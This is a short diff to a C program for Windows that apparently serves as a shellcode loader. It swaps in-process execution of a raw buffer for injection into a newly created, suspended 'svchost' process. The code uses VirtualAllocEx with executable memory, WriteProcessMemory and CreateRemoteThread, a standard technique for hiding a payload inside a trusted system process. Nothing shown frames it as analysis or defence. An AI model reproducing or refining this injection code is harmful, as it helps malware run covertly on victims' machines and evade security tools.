@@ -74,9 +74,13 @@ int main(int argc, char *argv[]) {
     return 0;
   }
 
-  void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  memcpy(ptr, raw, rawSize);
-  ((void (*)())ptr)();
+  STARTUPINFO si = {0};
+  PROCESS_INFORMATION pi = {0};
+  CreateProcess(0, "svchost", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
+
+  void *ptr = VirtualAllocEx(pi.hProcess, 0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  WriteProcessMemory(pi.hProcess, ptr, raw, rawSize, 0);
+  CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);
 
   free(raw);
 
